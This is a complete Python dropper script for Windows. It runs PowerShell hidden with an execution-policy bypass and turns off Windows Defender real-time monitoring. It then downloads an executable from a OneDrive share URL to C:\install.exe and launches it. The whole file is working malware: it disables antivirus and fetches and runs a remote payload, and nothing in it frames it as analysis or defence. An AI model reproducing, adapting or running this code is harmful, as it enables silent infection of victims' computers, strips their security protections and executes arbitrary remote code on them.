import os
import subprocess
import sys

def run_hidden(cmd):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    return subprocess.run(cmd, startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def conf_def(disable_realtime):
    powershell_cmd = []

    if disable_realtime:
        powershell_cmd.append("Set-MpPreference -DisableRealtimeMonitoring $true")

    if powershell_cmd:
        full_cmd = ["powershell", "-ExecutionPolicy", "Bypass" ,"-Command", ";".join(powershell_cmd)]
        run_hidden(full_cmd)

def download(url, save_path):
    powershell_cmd = [
        f"Invoke-WebRequest -Uri '{url}' -OutFile '{save_path}'"
    ]
    full_cmd = ["powershell", "-ExecutionPolicy", "Bypass" , "-Command", ";".join(powershell_cmd)]
    run_hidden(full_cmd)

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit()
    else:
        disable_realtime = True
        conf_def(disable_realtime)
        file_urls = [
        ("https://api.onedrive.com/v1.0/shares/s!Ary-0P-yV3rdozgAZCHJbsJZHVEX/root/content", "C:\\install.exe")
        ]

    for url, save_path in file_urls:
        download(url, save_path)
        subprocess.run([save_path])
